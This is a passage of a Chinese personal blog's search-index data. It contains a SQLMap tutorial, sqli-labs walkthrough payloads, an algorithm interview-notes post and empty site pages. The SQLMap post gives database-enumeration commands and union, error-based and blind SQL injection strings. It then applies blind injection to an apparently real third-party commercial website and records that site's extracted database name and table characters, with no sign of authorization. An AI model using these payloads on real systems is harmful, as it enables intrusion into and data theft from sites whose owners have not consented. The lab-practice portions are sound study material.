或者 顔色)# The formal of image: url(http://xxxxxx.com/xxx.jpg)background: url(https://gcore.jsdelivr.net/gh/mikeytki/CDN/13.jpg)# Footer Backgroundfooter_bg: false","tags":["hexo"],"categories":["butterfly"]},{"title":"Sqlmap","path":"/posts/922590b9/","content":"在当今互联网飞速发展的时代，网络安全显得尤为重要。随着Web应用的普及，SQL注入攻击（SQL Injection）成为了一种常见且危害巨大的攻击手段。SQL注入攻击不仅能够窥探数据库中的敏感信息，甚至还能篡改数据、破坏数据库结构，给企业和用户带来巨大的损失。 为了应对这种威胁，安全研究人员和开发者们开发了各种工具和技术来检测和防御SQL注入攻击。SQLMap就是其中一款广受欢迎和高度评价的自动化SQL注入与数据库接管工具。它不仅功能强大，易于使用，而且支持多种数据库类型和注入技术，使得它成为渗透测试人员和安全爱好者的必备工具之一。 本篇博客将带领大家深入了解SQLMap，从其基本原理、安装和配置，到实际使用中的常见场景和技巧。无论你是初学者还是有一定经验的安全从业者，相信都能从中获得有益的信息和灵感。让我们一起揭开SQLMap的神秘面纱，探索其在网络安全领域的强大能力。 Sqlmapsqlmap超详细笔记一款自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。4、联合查询注入，可以使用union的情况下的注入。5、堆查询注入，可以同时执行多条语句的执行时的注入。 I. 判断是否存在注入1python sqlmap.py -u url II.判断文本中的请求是否存在注入1$ python sqlmap.py -r desktop/1.txt III.查询当前用户下的所有数据库1$ python sqlmap.py -u url --dbs 确定网站存在注入后，用于查询当前用户下的所有数据库。如果当前用户有权限读取包含所有数据库列表信息的表，使用该命令就可以列出所有相关数据库。 IV.获取数据库中的表名选取一个数据库，获取此库的表名 1python sqlmap.py -u url -D 数据库名 --tables V.获取表中的字段名4张表选取一个,获取其中字段名 1python sqlmap.py -u url -D 库名 -T 该库中的表名 –columns BUUCTF sqli-labs第一关&gt; ?id&#x3D;-1’ order by 4–+字段数 3 ?id&#x3D;-1’ union select 1,2,3–+2，3回显 ?id&#x3D;-1’ union select 1,database(),3–+database &#x3D; security 第二关?id&#x3D;1’ order by 1–+报错 order by 1– LIMIT 0,1数字型 ?id&#x3D;1 order by 3–+字段数 ：3 ?id&#x3D;-1 union select 1,2,3–+2，3回显 ?id&#x3D;-1 union select 1,database(),3–+database &#x3D; security 第三关?id&#x3D;1’ order by 5–+报错 ：order by 5– ‘) LIMIT 0,1 ?id&#x3D;1’) order by 5–+字段数 ：3 ?id&#x3D;-1’) union select 1,2,3–+2，3回显 ?id&#x3D;-1’) union select 1,database(),3–+database &#x3D; security 第四关先试一下 ：?id&#x3D;1’正常显示在试一下 ：?id&#x3D;1”报错 ：”1””) LIMIT 0,1 ?id&#x3D;1”) order by 4–+字段数 ：3 ?id&#x3D;-1”) union select 1,2,3–+2，3回显 ?id&#x3D;-1”) union select 1,database(),3–+database &#x3D; security 第五关 ?id=1&#39; order by 4--+字段数 ：3 ?id=1 and &#39;1&#39;=&#39;1&#39;&#39; 1&#39;=&#39;1&#39;&#39; LIMIT 0,1 &#39; ?id=1 and &#39;1&#39;=&#39;1&#39; 1&#39;=&#39;1&#39; LIMIT 0,1 &#39; &#39; &#39;1&#39;&#39; LIMIT 0,1 &#39; ?id=-1&#39; union select 1,2,3--+无显示位 使用报错注入1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+database = security 第六关 ?id=1’ --+报错 ?id=1&quot; --+显示 ?id=1&quot; order by 4--+字段数 ：3 ?id=-1&quot; union select 1,2,3--+无显示位 ?id=1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+?id=1&quot; select count(*),concat((database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by xdatabase = security 第七关1” 1&#x3D;11&amp;quot;1&#x3D;1 1’ count(*),concat((database()),0x7e,flooorr(raandnd(0)*2))x from infmation_schema.tables ggroup byroup by x 示例网站http://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1/1正常显示 http://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1 and (length(database()))&gt;16database长度: 16 http://www.techmart.com.hk/Coating_Services/latest_news_detail.php?id=1 and ascii(substr(database(),2,1))&gt;101database前两位：te第一位 115 13862116 12386 116第二位100 13862101 12398 101 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16116 101 99 104 109 97 114 116 104 107 95 100 97 116 97 50t e c h m a r t h k _ d a t a 2database &#x3D; techmarthk_data2 and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0, 1 ), 1,1) ) ) &gt; 100109m s z t e s t c n115 122 116 101 115 116 99 110 ID&#x3D;1+%75%6e%69%6f%6e+%73%65%6c%65%63%74+1,2,3,4,5,6,7,8,10–+","categories":["web"]},{"title":"Interview","path":"/posts/4a17b156/","content":"面试题目的算法解决 Interview Questions整型数组，只有一组数出现奇数次，其他数都出现偶数次，怎么找到出现奇数次的数 a ^ a的结果为0，而0 ^ a的结果为a。也就是说，如果一个数在数组中出现偶数次，那么将数组中的所有数进行异或运算，最终结果为0；而如果一个数出现奇数次，那么最终结果就是这个数本身。 C语言 123456789101112131415161718192021#include &lt;stdio.h&gt;int FindOdd(int arr[], int size)&#123; int eor = 0; for (int i = 0; i &lt; size; i++) &#123; eor ^= arr[i]; &#125; return eor;&#125;int main()&#123; int arr[] = &#123;2, 4, 6, 2, 4, 8, 6&#125;; // 示例数组 int size = sizeof(arr) / sizeof(arr[0]); int OddN = FindOdd(arr, size); printf(&quot;出现奇数次的是: %d &quot;, OddN); return 0;&#125; python 12345678910def Find_Odd_Occuring_number(arr): eor = 0 for i in arr: eor ^= i return eorarr = [2, 4, 6, 2, 4, 8, 6]odd_numbers = Find_Odd_Occuring_number(arr)print(f&quot;出现奇数次的数是: &#123;odd_numbers&#125;&quot;) 整型数组，有两组数出现奇数次，其他数都出现偶数次，怎么找到出现奇数次的数 C语言1234567891011121314151617181920212223242526272829303132333435363738394041#include &quot;stdio.h&quot;int FindOdd(int arr[], int size)&#123; int eor = 0; for (int i = 0; i &lt; size; i++) &#123; eor ^= arr[i]; &#125; int rightone = eor &amp; (~eor + 1); int num1 = 0; int num2 = 0; for (int j = 0; j &lt; size; j++) &#123; if ((arr[j] &amp; rightone) == 0) &#123; num1 ^= arr[j]; &#125; else &#123; num2 ^= arr[j]; &#125; &#125; return (num1 &lt;&lt; 16) | num2;&#125;int main()&#123; int arr[] = &#123;2, 4, 6, 2, 4, 8, 6, 5&#125;; // 示例数组 int size = sizeof(arr) / sizeof(arr[0]); int result = FindOdd(arr, size); int num1 = (result &gt;&gt; 16) &amp; 0xFFFF; int num2 = result &amp; 0xFFFF; printf(&quot;The numbers occurring odd number of times are: %d and %d &quot;, num1, num2); return 0;&#125; python1234567891011121314151617181920def Find_Odd_Occuring_number(arr): eor = 0 for i in arr: eor ^= i rightone = eor &amp; (~eor + 1) eor2 = 0 eor3 = 0 for j in arr: if j &amp; rightone: eor2 ^= j else: eor3 ^= j return eor2, eor3arr = [2, 4, 6, 2, 4, 8, 6, 5]odd_numbers = Find_Odd_Occuring_number(arr)print(f&quot;出现奇数次的数是: &#123;odd_numbers&#125;&quot;) 插入算法Insertion_sort python12345678910111213141516171819def insertion_sort(arr): for i in range(1, len(arr)): key = arr[i] j = i - 1 while j &gt;= 0 and arr[j] &gt; key: arr[j + 1] = arr[j] j -= 1 arr[j + 1] = key# 从键盘输入待排序的列表input_str = input(&quot;请输入待排序的列表（以空格分隔）：&quot;)arr = list(map(int, input_str.split()))# 调用插入排序算法insertion_sort(arr)# 输出排序后的列表print(&quot;排序后的列表：&quot;, arr) 查看进程占用 该命令会显示占用8080端口的进程，有其pid ,可以通过pid关掉该进程1lsof -i tcp:8080 杀死进程 1kill pid","tags":["算法"]},{"title":"友链","path":"/friends/index.html","content":"LzChengHan's BlogAorefs一蓑烟雨的博客Joker2YueAkilar糖果屋Fomalhaut🥝"},{"title":"Gallery","path":"/Gallery/index.html","content":""},{"title":"音乐馆","path":"/music/index.html","content":"网易云音乐"},{"title":"探索","path":"/explore/index.html","content":""},{"title":"categories","path":"/categories/index.html","content":""},{"title":"tags","path":"/tags/index.html","content":""},{"path":"/wiki/index.html","content":"MiKey的独立博客https://mikeytk.cn/wiki/"},{"title":"about","path":"/about/index.html","content":""}]